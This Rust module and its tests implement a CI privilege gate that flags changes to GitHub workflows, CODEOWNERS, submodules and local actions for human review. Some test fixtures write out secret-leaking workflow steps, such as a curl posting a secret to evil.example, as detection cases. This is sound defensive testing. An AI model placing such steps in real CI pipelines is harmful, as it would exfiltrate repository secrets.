//! The privilege gate (p4-design §3 step 4): before R is pushed where
//! Actions would run it, a human decides on any result that changes how CI
//! runs. The gate is path-based and fails closed: a result needs a decision
//! when any path that differs between target tip X and R lies under
//! `.github/` (any letter case; also the `.github` entry itself,
//! `.gitmodules` and `CODEOWNERS`), or inside the local-action scope that
//! `local_actions` reads from X (compared ignoring letter case; the whole
//! repository when X holds a reference it cannot read). A changed path whose
//! content cannot be read on either side is gated as `unreadable`. Results
//! that change none of these paths pass untouched.
//!
//! The reason codes are hints for the human, never the gate itself: a
//! case-insensitive line scan (see [`SENSITIVE`] and [`PRIVILEGED`]) names
//! what an edit touches. A gated path under `.github/` it finds nothing in
//! carries `changed_ci_definition`; a gated path outside `.github/` always
//! carries `changed_local_action`, or `unparsed_local_action_reference` when
//! it is gated only because X's scope could not be read.
use crate::git;
use crate::local_actions::{self, LocalScope};
use anyhow::Result;
use serde::Serialize;
use std::path::Path;

/// The directory whose every change needs a decision.
const CI_DIR: &str = ".github/";
/// Single files outside [`CI_DIR`] that also define how CI and review run:
/// the `.github` entry itself (a symlink or gitlink replacing the
/// directory), `.gitmodules` (what a submodule checkout fetches) and
/// `CODEOWNERS` in any of the places GitHub reads it.
const CI_FILES: &[&str] = &[".github", ".gitmodules", "codeowners", "docs/codeowners"];
/// The fallback reason for a gated path under [`CI_DIR`] or in [`CI_FILES`].
const CI_REASON: &str = "changed_ci_definition";
/// Terms that make an added line worth naming, with the reason recorded.
const SENSITIVE: &[(&str, &str)] = &[
    ("secret", "adds_secrets"),
    ("permissions", "adds_permissions"),
    ("write", "adds_write"),
    ("token", "adds_token"),
    ("inherit", "adds_inherit"),
    ("pull_request_target", "adds_pull_request_target"),
    ("workflow_run", "adds_workflow_run"),
    ("uses:", "adds_uses"),
];
/// Terms that mark a whole file as privileged: any change to it is named.
const PRIVILEGED: &[&str] = &["secret", "write", "token"];
/// Above this many line pairs the line diff is skipped and every line of
/// both versions counts as changed.
const MAX_DIFF_CELLS: usize = 4_000_000;

/// One gated path R changes, with the reasons found for the human.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Finding {
    pub path: String,
    pub reasons: Vec<&'static str>,
}

/// Gated paths that differ between `x` and `r`; empty when R may proceed
/// without a decision. `required` lists the roster's workflow paths.
pub fn findings(mirror: &Path, x: &str, r: &str, required: &[String]) -> Result<Vec<Finding>> {
    let changed = git::changed_paths(mirror, x, r)?;
    if changed.is_empty() {
        return Ok(Vec::new());
    }
    let local = local_actions::collect(mirror, x, r, &changed)?;
    let mut found = Vec::new();
    for path in changed {
        let Some(fallback) = scope(&path, &local) else {
            continue;
        };
        let before = git::file_at(mirror, x, &path).ok();
        let after = git::file_at(mirror, r, &path).ok();
        let is_required = required.contains(&path);
        let reasons = classify(is_required, fallback, before, after);
        found.push(Finding { path, reasons });
    }
    Ok(found)
}

/// The fallback reason of the gated area `path` lies in; `None` when a
/// change to it needs no decision.
fn scope(path: &str, local: &LocalScope) -> Option<&'static str> {
    if is_ci_definition(&path.to_ascii_lowercase()) {
        return Some(CI_REASON);
    }
    if local.unparsed {
        return Some("unparsed_local_action_reference");
    }
    local.covers(path).then_some("changed_local_action")
}

/// Whether the lowercased `path` is under [`CI_DIR`] or one of [`CI_FILES`].
fn is_ci_definition(path: &str) -> bool {
    path.starts_with(CI_DIR) || CI_FILES.contains(&path)
}

/// Reasons for one gated path. `before` and `after` are its contents at X
/// and R: `None` when reading failed, `Some(None)` when absent. A path
/// unreadable on either side, or absent on both, is `unreadable`.
fn classify(
    required: bool,
    fallback: &'static str,
    before: Option<Option<String>>,
    after: Option<Option<String>>,
) -> Vec<&'static str> {
    let (Some(before), Some(after)) = (before, after) else {
        return vec!["unreadable"];
    };
    if before.is_none() && after.is_none() {
        return vec!["unreadable"];
    }
    let mut found = reasons(required, before.as_deref(), after.as_deref());
    if found.is_empty() || fallback != CI_REASON {
        found.push(fallback);
    }
    found
}

/// Why one changed file needs a decision; empty when it does not. A deleted
/// file grants nothing unless it defined a required check.
fn reasons(required: bool, before: Option<&str>, after: Option<&str>) -> Vec<&'static str> {
    let mut reasons = Vec::new();
    if required {
        reasons.push("required_check_workflow");
    }
    let Some(after) = after else {
        return reasons;
    };
    let Some(before) = before else {
        reasons.push("new_file");
        reasons.extend(added_reasons(&after.lines().collect::<Vec<_>>()));
        return reasons;
    };
    let (added, removed) = changed_lines(before, after);
    reasons.extend(edit_reasons(before, after, &added, &removed));
    reasons
}

/// Reasons from an edit of an existing file.
fn edit_reasons(before: &str, after: &str, added: &[&str], removed: &[&str]) -> Vec<&'static str> {
    let mut reasons = added_reasons(added);
    if removed.iter().any(|line| mentions(line, "permissions")) {
        reasons.push("removes_permissions");
    }
    if triggers(before) != triggers(after) {
        reasons.push("triggers_changed");
    }
    let changed = !added.is_empty() || !removed.is_empty();
    if changed && PRIVILEGED.iter().any(|term| mentions(after, term)) {
        reasons.push("changes_privileged_file");
    }
    reasons
}

/// The reason of every sensitive term some added line mentions.
fn added_reasons(added: &[&str]) -> Vec<&'static str> {
    let hit = |term: &str| added.iter().any(|line| mentions(line, term));
    SENSITIVE
        .iter()
        .filter(|(term, _)| hit(term))
        .map(|(_, reason)| *reason)
        .collect()
}

/// True when `text` contains `term`, ignoring ASCII letter case.
fn mentions(text: &str, term: &str) -> bool {
    text.to_ascii_lowercase().contains(term)
}

/// Lines only in `after` (added) and only in `before` (removed), by a
/// longest-common-subsequence line diff, so moved lines count as changed.
fn changed_lines<'a>(before: &'a str, after: &'a str) -> (Vec<&'a str>, Vec<&'a str>) {
    let (old, new): (Vec<&str>, Vec<&str>) = (before.lines().collect(), after.lines().collect());
    if old.len().saturating_mul(new.len()) > MAX_DIFF_CELLS {
        return (new, old);
    }
    let table = lcs_table(&old, &new);
    let (mut i, mut j) = (0, 0);
    let (mut added, mut removed) = (Vec::new(), Vec::new());
    while i < old.len() || j < new.len() {
        if i < old.len() && j < new.len() && old[i] == new[j] {
            (i, j) = (i + 1, j + 1);
        } else if j < new.len() && (i == old.len() || table[i][j + 1] >= table[i + 1][j]) {
            added.push(new[j]);
            j += 1;
        } else {
            removed.push(old[i]);
            i += 1;
        }
    }
    (added, removed)
}

/// `table[i][j]` is the LCS length of `old[i..]` and `new[j..]`.
fn lcs_table(old: &[&str], new: &[&str]) -> Vec<Vec<usize>> {
    let mut table = vec![vec![0; new.len() + 1]; old.len() + 1];
    for i in (0..old.len()).rev() {
        for j in (0..new.len()).rev() {
            table[i][j] = if old[i] == new[j] {
                table[i + 1][j + 1] + 1
            } else {
                table[i + 1][j].max(table[i][j + 1])
            };
        }
    }
    table
}

/// The top-level `on:` block (its key line and indented body), which
/// declares a workflow's triggers; empty for files without one.
fn triggers(text: &str) -> String {
    let mut block = Vec::new();
    for line in text.lines() {
        let top_level = !line.starts_with([' ', '\t', '#']) && !line.trim().is_empty();
        if top_level && !block.is_empty() {
            break;
        }
        let key = line
            .split(':')
            .next()
            .unwrap_or("")
            .trim_matches(['"', '\'']);
        if !block.is_empty() || (top_level && key == "on") {
            block.push(line.trim_end());
        }
    }
    block.join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git::testing::{commit, git, remote};

    /// A workflow with one read-only job and no secrets.
    const PLAIN: &str = "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: make test\n";

    /// Reasons for editing `before` into `after` in a non-roster file.
    fn edit(before: &str, after: &str) -> Vec<&'static str> {
        reasons(false, Some(before), Some(after))
    }

    /// Asserts that editing `before` into `after` needs a decision.
    fn gated(before: &str, after: &str) {
        assert!(!edit(before, after).is_empty(), "{before:?} -> {after:?}");
    }

    #[test]
    fn quoted_and_spaced_write_permissions_are_gated() {
        gated(PLAIN, &PLAIN.replace("contents: read", "contents: 'write'"));
        gated(PLAIN, &PLAIN.replace("contents: read", "contents:  write"));
    }

    #[test]
    fn inline_permission_maps_are_gated() {
        let inline = PLAIN.replace(
            "    permissions:\n      contents: read\n",
            "    permissions: { contents: write }\n",
        );
        gated(PLAIN, &inline);
    }

    #[test]
    fn deleting_the_permissions_block_is_gated() {
        let bare = PLAIN.replace("    permissions:\n      contents: read\n", "");
        assert!(edit(PLAIN, &bare).contains(&"removes_permissions"));
    }

    #[test]
    fn indexed_secrets_are_gated() {
        let step = "      - run: deploy ${{ secrets['DEPLOY_KEY'] }}\n";
        gated(PLAIN, &format!("{PLAIN}{step}"));
    }

    #[test]
    fn serialized_secrets_are_gated() {
        let step = "      - run: echo '${{ toJSON(secrets) }}'\n";
        gated(PLAIN, &format!("{PLAIN}{step}"));
    }

    #[test]
    fn a_hash_inside_a_string_does_not_hide_a_secret() {
        let step = "      - run: curl 'https://x/#' -d ${{ secrets.K }}\n";
        gated(PLAIN, &format!("{PLAIN}{step}"));
    }

    #[test]
    fn quoted_inherited_secrets_are_gated() {
        let caller = "on: push\njobs:\n  c:\n    uses: ./.github/workflows/r.yml\n";
        gated(caller, &format!("{caller}    secrets: \"inherit\"\n"));
    }

    #[test]
    fn switching_one_secret_for_another_is_gated() {
        let with = |name: &str| format!("{PLAIN}      - run: deploy ${{{{ secrets.{name} }}}}\n");
        gated(&with("A"), &with("B"));
    }

    #[test]
    fn a_new_step_in_a_file_holding_a_secret_is_gated() {
        let before = format!("{PLAIN}    env:\n      T: ${{{{ secrets.T }}}}\n");
        let after = format!("{before}      - run: curl -d \"$T\" evil.example\n");
        assert!(edit(&before, &after).contains(&"changes_privileged_file"));
    }

    #[test]
    fn a_second_write_permission_is_gated() {
        let two = "on: push\njobs:\n  a:\n    permissions:\n      contents: write\n  b:\n    permissions:\n      contents: read\n";
        gated(two, &two.replace("contents: read", "id-token: write"));
    }

    #[test]
    fn new_files_and_required_workflows_are_gated() {
        assert_eq!(reasons(false, None, Some("on: push\n")), ["new_file"]);
        assert_eq!(
            reasons(true, Some(PLAIN), None),
            ["required_check_workflow"]
        );
        let triggers = PLAIN.replace("on: push", "on: [push, schedule]");
        assert!(edit(PLAIN, &triggers).contains(&"triggers_changed"));
    }

    #[test]
    fn unreadable_paths_are_gated() {
        let text = Some(Some(PLAIN.to_owned()));
        let fallback = "changed_ci_definition";
        assert_eq!(
            classify(false, fallback, None, text.clone()),
            ["unreadable"]
        );
        assert_eq!(classify(false, fallback, text, None), ["unreadable"]);
        assert_eq!(
            classify(false, fallback, Some(None), Some(None)),
            ["unreadable"]
        );
    }

    /// Commits `content` at `path`; content starting with `-> ` commits a
    /// symbolic link to the rest instead.
    fn commit_entry(repo: &Path, path: &str, content: &str) -> String {
        let Some(target) = content.strip_prefix("-> ") else {
            return commit(repo, path, content);
        };
        let link = repo.join(path);
        std::fs::create_dir_all(link.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(target, &link).unwrap();
        git(repo, &["add", path]);
        git(repo, &["commit", "--quiet", "-m", path]);
        git(repo, &["rev-parse", "HEAD"])
    }

    /// Findings for `edits` on top of a remote whose `main` holds `files`.
    fn findings_after(files: &[(&str, &str)], edits: &[(&str, &str)]) -> Vec<Finding> {
        let remote = remote();
        let mut x = git(&remote.source, &["rev-parse", "HEAD"]);
        for (path, content) in files {
            x = commit_entry(&remote.source, path, content);
        }
        let mut r = x.clone();
        for (path, content) in edits {
            r = commit_entry(&remote.source, path, content);
        }
        findings(&remote.source, &x, &r, &[]).unwrap()
    }

    /// A workflow that runs the local action in `ci/setup`.
    const CALLER: &str = "on: push\njobs:\n  t:\n    steps:\n      - uses: ./ci/setup\n";

    /// The reasons for `ci/x/run.sh` when X's workflow holds `steps` and
    /// R edits that script and `src/lib.rs`.
    fn script_reasons(steps: &str) -> Vec<Vec<&'static str>> {
        let workflow = format!("on: push\njobs:\n  t:\n    runs-on: x\n{steps}");
        let files = [
            (".github/workflows/a.yml", workflow.as_str()),
            ("ci/x/run.sh", "make\n"),
        ];
        let edits = [("ci/x/run.sh", "make all\n"), ("src/lib.rs", "x\n")];
        let found = findings_after(&files, &edits);
        found.into_iter().map(|f| f.reasons).collect()
    }

    /// Asserts the X spelling `steps` puts `ci/x` in scope, and only it.
    fn scoped(steps: &str) {
        assert_eq!(
            script_reasons(steps),
            [vec!["changed_local_action"]],
            "{steps:?}"
        );
    }

    /// Asserts the X spelling `steps` gates the whole repository.
    fn fails_closed(steps: &str) {
        let unparsed = "unparsed_local_action_reference";
        let expected = [vec![unparsed], vec!["new_file", unparsed]];
        assert_eq!(script_reasons(steps), expected, "{steps:?}");
    }

    #[test]
    fn flow_map_references_are_scoped() {
        scoped("    steps:\n      - {uses: ./ci/x}\n");
    }

    #[test]
    fn flow_sequence_references_are_scoped() {
        scoped("    steps: [{uses: ./ci/x, with: {a: 1}}]\n");
    }

    #[test]
    fn quoted_key_references_are_scoped() {
        scoped("    steps:\n      - \"uses\": ./ci/x\n");
    }

    #[test]
    fn spaced_colon_references_are_scoped() {
        scoped("    steps:\n      - uses : ./ci/x\n");
    }

    #[test]
    fn next_line_references_are_scoped() {
        scoped("    steps:\n      - uses:\n          ./ci/x\n");
    }

    #[test]
    fn folded_references_are_scoped() {
        scoped("    steps:\n      - uses: >-\n          ./ci/x\n");
    }

    #[test]
    fn two_references_on_one_line_are_scoped() {
        scoped("    steps: [{uses: actions/checkout@v4}, {uses: ./ci/x}]\n");
    }

    #[test]
    fn uppercase_references_are_scoped() {
        scoped("    steps:\n      - uses: ./CI/X\n");
    }

    #[test]
    fn alias_references_fail_closed() {
        fails_closed("    steps:\n      - uses: *act\n");
    }

    #[test]
    fn escaped_references_fail_closed() {
        fails_closed("    steps:\n      - uses: \"./ci/\\x78\"\n");
    }

    #[test]
    fn symlinked_action_targets_are_scoped() {
        let files = [
            (
                ".github/workflows/a.yml",
                "on: push\njobs:\n  t:\n    steps:\n      - uses: ./.github/actions/x\n",
            ),
            (".github/actions/x", "-> ../../ci/x"),
            ("ci/x/action.yml", "runs:\n  using: composite\n"),
        ];
        let found = findings_after(&files, &[("ci/x/action.yml", "runs:\n  using: node20\n")]);
        assert_eq!(found.len(), 1, "{found:?}");
        assert_eq!(found[0].reasons, ["changed_local_action"]);
    }

    #[test]
    fn runs_main_targets_are_scoped() {
        let files = [
            (
                ".github/workflows/a.yml",
                "on: push\njobs:\n  t:\n    steps:\n      - uses: ./ci/x\n",
            ),
            (
                "ci/x/action.yml",
                "runs:\n  using: node20\n  main: ../../scripts/run.js\n",
            ),
            ("scripts/run.js", "run()\n"),
        ];
        let found = findings_after(&files, &[("scripts/run.js", "steal()\n")]);
        assert_eq!(found.len(), 1, "{found:?}");
        assert_eq!(found[0].path, "scripts/run.js");
    }

    #[test]
    fn unreadable_references_only_in_r_are_gated_as_ci_changes() {
        let files = [(".github/workflows/a.yml", PLAIN)];
        let weird = format!("{PLAIN}      - uses: *act\n");
        let edits = [
            (".github/workflows/a.yml", weird.as_str()),
            ("src/lib.rs", "x\n"),
        ];
        let found = findings_after(&files, &edits);
        let paths: Vec<_> = found.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(
            paths,
            [".github/workflows/a.yml"],
            "src/lib.rs follows X's scope"
        );
        assert!(!found[0].reasons.is_empty());
    }

    /// The `.github` entry itself (a symlink or gitlink replacing the
    /// directory) and the root CI files count as CI definitions.
    #[test]
    fn ci_root_entries_are_ci_definitions() {
        for path in [".github", ".gitmodules", "codeowners", "docs/codeowners"] {
            assert!(is_ci_definition(path), "{path}");
        }
        assert!(!is_ci_definition(".githubx"));
        assert!(!is_ci_definition("src/codeowners"));
    }

    /// `.gitmodules` and `CODEOWNERS` outside `.github/` still need a decision.
    #[test]
    fn submodule_and_owner_files_are_gated() {
        let files = [("src/lib.rs", "fn main() {}\n")];
        let found = findings_after(
            &files,
            &[
                (".gitmodules", "[submodule \"x\"]\n"),
                ("CODEOWNERS", "* @x\n"),
            ],
        );
        let paths: Vec<_> = found.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, [".gitmodules", "CODEOWNERS"], "{found:?}");
    }

    #[test]
    fn edits_outside_ci_and_local_actions_pass() {
        let files = [
            (".github/workflows/a.yml", CALLER),
            ("ci/setup/action.yml", "runs:\n"),
        ];
        let found = findings_after(
            &files,
            &[("src/lib.rs", "secrets.TOKEN\n"), ("ci/setupx.txt", "x\n")],
        );
        assert!(found.is_empty(), "{found:?}");
    }

    #[test]
    fn plain_ci_edits_are_gated_as_ci_changes() {
        let files = [(".github/workflows/a.yml", PLAIN)];
        let edited = PLAIN.replace("make test", "make test-all");
        let found = findings_after(&files, &[(".github/workflows/a.yml", &edited)]);
        assert_eq!(found[0].reasons, ["changed_ci_definition"]);
        let found = findings_after(&files, &[(".github/CODEOWNERS", "* @me\n")]);
        assert_eq!(found[0].reasons, ["new_file"]);
    }

    #[test]
    fn non_ascii_workflow_names_are_read_and_gated() {
        let deploy = "on: push\njobs:\n  d:\n    env:\n      T: ${{ secrets.T }}\n";
        let found = findings_after(
            &[("README.md", "r\n")],
            &[(".github/workflows/déploy.yml", deploy)],
        );
        assert_eq!(found[0].path, ".github/workflows/déploy.yml");
        assert!(found[0].reasons.contains(&"adds_secrets"), "{found:?}");
    }

    #[test]
    fn escaped_terms_are_still_gated() {
        let files = [(".github/workflows/a.yml", PLAIN)];
        let escaped = format!("{PLAIN}      - run: \"echo ${{{{ s\\x65crets.K }}}} wr\\x69te\"\n");
        let found = findings_after(&files, &[(".github/workflows/a.yml", &escaped)]);
        assert_eq!(found.len(), 1, "{found:?}");
    }

    #[test]
    fn referenced_local_action_edits_are_gated() {
        let files = [
            (".github/workflows/a.yml", CALLER),
            ("ci/setup/action.yml", "runs:\n  using: composite\n"),
        ];
        let found = findings_after(
            &files,
            &[
                (
                    "ci/setup/action.yml",
                    "runs:\n  using: composite\n  steps: []\n",
                ),
                ("ci/setup/dist/index.js", "x\n"),
            ],
        );
        let paths: Vec<_> = found
            .iter()
            .map(|f| (f.path.as_str(), f.reasons.clone()))
            .collect();
        assert_eq!(
            paths,
            [
                ("ci/setup/action.yml", vec!["changed_local_action"]),
                (
                    "ci/setup/dist/index.js",
                    vec!["new_file", "changed_local_action"]
                )
            ]
        );
    }

    #[test]
    fn switching_a_composite_action_to_node_is_gated() {
        let composite = "runs:\n  using: composite\n  steps:\n    - run: make\n";
        let files = [(".github/actions/setup/action.yml", composite)];
        let node = "runs:\n  using: node20\n  main: dist/index.js\n";
        let found = findings_after(&files, &[(".github/actions/setup/action.yml", node)]);
        assert_eq!(found[0].reasons, ["changed_ci_definition"]);
    }

    #[test]
    fn unchanged_trees_need_no_decision() {
        assert!(findings_after(&[(".github/workflows/a.yml", PLAIN)], &[]).is_empty());
        assert!(
            edit(PLAIN, &PLAIN.replace("make test", "make test-all")).is_empty(),
            "the scan names nothing; the path gates"
        );
    }
}
